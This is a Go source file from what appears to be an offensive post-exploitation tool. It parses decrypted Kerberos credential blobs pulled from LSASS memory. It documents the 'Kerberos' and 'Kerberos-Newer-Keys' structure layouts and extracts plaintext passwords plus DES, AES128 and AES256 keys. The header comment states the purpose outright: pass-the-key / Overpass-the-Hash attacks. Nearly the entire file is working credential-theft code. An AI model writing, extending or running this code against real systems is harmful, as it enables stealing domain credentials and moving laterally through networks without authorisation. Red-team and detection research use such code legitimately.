package commands

// Kerberos credential parsing for LSASS in-situ extraction.
//
// The KIWI_MSV1_0_PRIMARY_CREDENTIALS chain in LSASS can contain Kerberos
// credential entries identified by the Primary name string:
//   - "Kerberos"            → old format with plaintext password only
//   - "Kerberos-Newer-Keys" → 1607+ format with DES/AES128/AES256 keys
//
// After decryption by Phase 2C-ii-b, the plaintext blob is parsed here to
// extract keys for pass-the-key attacks (Overpass-the-Hash / T1550.002).

import (
	"encoding/binary"
	"fmt"
)

// kerbEncType identifies the Kerberos encryption type for extracted keys.
type kerbEncType uint32

const (
	kerbEncDES_CBC_MD5             kerbEncType = 3
	kerbEncAES128_CTS_HMAC_SHA1_96 kerbEncType = 17
	kerbEncAES256_CTS_HMAC_SHA1_96 kerbEncType = 18
	kerbEncRC4_HMAC                kerbEncType = 23
)

func (t kerbEncType) String() string {
	switch t {
	case kerbEncDES_CBC_MD5:
		return "des-cbc-md5"
	case kerbEncAES128_CTS_HMAC_SHA1_96:
		return "aes128-cts-hmac-sha1-96"
	case kerbEncAES256_CTS_HMAC_SHA1_96:
		return "aes256-cts-hmac-sha1-96"
	case kerbEncRC4_HMAC:
		return "rc4-hmac"
	default:
		return fmt.Sprintf("etype-%d", uint32(t))
	}
}

// kerberosKey is a single extracted Kerberos key.
type kerberosKey struct {
	EncType  kerbEncType
	KeyBytes []byte
}

// kerberosCredential is the parsed result of a Kerberos credential blob from
// the LSASS credential chain.
type kerberosCredential struct {
	Format      string
	Password    string
	PasswordLen uint16
	Keys        []kerberosKey
	ParseErrors []string
}

// KIWI_KERBEROS_PRIMARY_CREDENTIAL (old format) x64 layout:
//
//	+0x00  UserName  (LSA_UNICODE_STRING, 16 bytes)
//	+0x10  Domain    (LSA_UNICODE_STRING, 16 bytes)
//	+0x20  Password  (LSA_UNICODE_STRING, 16 bytes)
//	total header: 0x30 = 48 bytes
const kerbOldHeaderSize = 0x30

// KIWI_KERBEROS_PRIMARY_CREDENTIAL_10_1607 (newer keys) x64 layout:
//
//	+0x00  UserName       (LSA_UNICODE_STRING, 16 bytes)
//	+0x10  Domain         (LSA_UNICODE_STRING, 16 bytes)
//	+0x20  unkFunction    (PVOID, 8 bytes)
//	+0x28  type           (DWORD, 4 bytes)
//	+0x2C  unk0           (DWORD, 4 bytes)
//	+0x30  Password       (LSA_UNICODE_STRING, 16 bytes)
//	+0x40  unk1           (PVOID, 8 bytes)
//	+0x48  unk2           (PVOID, 8 bytes)
//	+0x50  unk3           (PVOID, 8 bytes)
//	+0x58  unk4           (32 bytes)
//	+0x78  keyType        (DWORD, 4 bytes)
//	+0x7C  iterationCount (DWORD, 4 bytes)
//	+0x80  keys[3]        (KERB_KEY_DATA_NEW × 3, 72 bytes)
//	+0xC8  pKeyValue      (PVOID, 8 bytes)
//	+0xD0  unkFilled      (PVOID, 8 bytes)
//	total header: 0xD8 = 216 bytes
const (
	kerbNewHeaderSize   = 0xD8
	kerbNewPasswordOff  = 0x30
	kerbNewKeysArrayOff = 0x80
	kerbNewKeyDataSize  = 24
	kerbNewMaxKeys      = 3
)

// KERB_KEY_DATA_NEW layout (24 bytes):
//
//	+0x00  reserved1  (DWORD)
//	+0x04  reserved2  (DWORD)
//	+0x08  reserved3  (DWORD)
//	+0x0C  KeyType    (DWORD — Kerberos encryption type)
//	+0x10  KeyLength  (DWORD)
//	+0x14  KeyOffset  (DWORD — offset into the decrypted blob)
const (
	kerbKeyDataTypeOff   = 0x0C
	kerbKeyDataLenOff    = 0x10
	kerbKeyDataOffsetOff = 0x14
)

// parseKerberosNewerKeys parses a decrypted "Kerberos-Newer-Keys" blob.
// blobBase is the LSASS virtual address of the encrypted blob (needed to
// resolve LSA_UNICODE_STRING.Buffer pointers to offsets within plaintext).
func parseKerberosNewerKeys(plaintext []byte, blobBase uintptr) kerberosCredential {
	cred := kerberosCredential{Format: "Kerberos-Newer-Keys"}
	addErr := func(format string, args ...interface{}) {
		cred.ParseErrors = append(cred.ParseErrors, fmt.Sprintf(format, args...))
	}

	if len(plaintext) < kerbNewHeaderSize {
		addErr("plaintext too short: got %d, need >= %d", len(plaintext), kerbNewHeaderSize)
		return cred
	}

	pwd, pwdLen := extractInlineUnicodeString(plaintext, kerbNewPasswordOff, blobBase)
	cred.Password = pwd
	cred.PasswordLen = pwdLen

	for i := 0; i < kerbNewMaxKeys; i++ {
		off := kerbNewKeysArrayOff + i*kerbNewKeyDataSize
		if off+kerbNewKeyDataSize > len(plaintext) {
			break
		}

		keyType := kerbEncType(binary.LittleEndian.Uint32(plaintext[off+kerbKeyDataTypeOff:]))
		keyLen := binary.LittleEndian.Uint32(plaintext[off+kerbKeyDataLenOff:])
		keyOffset := binary.LittleEndian.Uint32(plaintext[off+kerbKeyDataOffsetOff:])

		if keyLen == 0 {
			continue
		}
		if keyLen > 256 {
			addErr("key[%d] (etype=%s): unreasonable length %d", i, keyType, keyLen)
			continue
		}
		if int(keyOffset)+int(keyLen) > len(plaintext) {
			addErr("key[%d] (etype=%s): offset %d + len %d exceeds blob size %d", i, keyType, keyOffset, keyLen, len(plaintext))
			continue
		}

		keyBytes := make([]byte, keyLen)
		copy(keyBytes, plaintext[keyOffset:int(keyOffset)+int(keyLen)])
		cred.Keys = append(cred.Keys, kerberosKey{
			EncType:  keyType,
			KeyBytes: keyBytes,
		})
	}
	return cred
}

// parseKerberosOld parses a decrypted "Kerberos" (old format) credential blob.
// Contains UserName, Domain, Password — no key array.
func parseKerberosOld(plaintext []byte, blobBase uintptr) kerberosCredential {
	cred := kerberosCredential{Format: "Kerberos"}
	if len(plaintext) < kerbOldHeaderSize {
		cred.ParseErrors = append(cred.ParseErrors,
			fmt.Sprintf("plaintext too short: got %d, need >= %d", len(plaintext), kerbOldHeaderSize))
		return cred
	}

	pwd, pwdLen := extractInlineUnicodeString(plaintext, 0x20, blobBase)
	cred.Password = pwd
	cred.PasswordLen = pwdLen
	return cred
}

// extractInlineUnicodeString reads an LSA_UNICODE_STRING header at the given
// offset in the decrypted plaintext, computes the string data's position using
// the Buffer pointer and blobBase, and returns the decoded UTF-16LE string.
//
// The Buffer pointer in the decrypted blob is an LSASS-virtual address. The
// string data is stored inline in the same encrypted region, so:
//
//	string_offset_in_blob = Buffer - blobBase
func extractInlineUnicodeString(plaintext []byte, headerOffset int, blobBase uintptr) (string, uint16) {
	if headerOffset+16 > len(plaintext) {
		return "", 0
	}
	length := binary.LittleEndian.Uint16(plaintext[headerOffset:])
	if length == 0 {
		return "", 0
	}

	bufPtr := binary.LittleEndian.Uint64(plaintext[headerOffset+8:])
	if bufPtr == 0 || blobBase == 0 {
		return "", length
	}

	relOff := int64(bufPtr) - int64(blobBase)
	if relOff < 0 || int(relOff)+int(length) > len(plaintext) {
		return "", length
	}

	return utf16LEToString(plaintext[int(relOff) : int(relOff)+int(length)]), length
}
